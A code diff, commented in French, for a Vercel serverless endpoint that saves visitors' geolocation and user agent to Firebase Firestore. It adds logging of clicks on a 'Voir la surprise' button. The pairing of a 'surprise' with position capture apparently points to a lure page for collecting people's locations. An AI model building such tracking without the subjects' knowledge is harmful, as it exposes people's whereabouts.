@@ -1,7 +1,7 @@
 /**
  * ============================================================
  *  VERCEL SERVERLESS — POST /api/save
- *  Enregistre une position dans Firebase Firestore
+ *  Enregistre une position ou une "Vue" dans Firebase
  * ============================================================
  */
 
@@ -19,12 +19,28 @@ module.exports = async (req, res) => {
   try {
     if (!db) { throw new Error("Firebase non configuré dans les variables d'environnement."); }
 
-    const { latitude, longitude, accuracy, timestamp } = req.body || {};
+    const { type, latitude, longitude, accuracy, timestamp } = req.body || {};
+    
+    // ── NOUVEAU : Gérer le clic sur "Voir la surprise" ──
+    if (type === "view") {
+      const entry = {
+        type: "view",
+        dateReceived: new Date().toISOString(),
+        userAgent: req.headers["user-agent"] || "Inconnu",
+      };
+      const docRef = await addDoc(collection(db, "positions"), entry);
+      entry.id = docRef.id;
+      console.log(`[Vercel Firestore] Surprise VUE, id=${docRef.id}`);
+      return res.status(200).json({ success: true, message: "Vue de la surprise enregistrée.", entry });
+    }
+
+    // ── Gérer la position géographique ──
     if (latitude === undefined || longitude === undefined) {
       return res.status(400).json({ success: false, message: "latitude et longitude sont requis." });
     }
 
     const entry = {
+      type: "location",
       latitude: parseFloat(latitude),
       longitude: parseFloat(longitude),
       accuracy: accuracy !== undefined ? parseFloat(accuracy) : null,
@@ -33,7 +49,6 @@ module.exports = async (req, res) => {
       userAgent: req.headers["user-agent"] || "Inconnu",
     };
 
-    // Firebase envoie vers le Cloud
     const docRef = await addDoc(collection(db, "positions"), entry);
     entry.id = docRef.id;
 
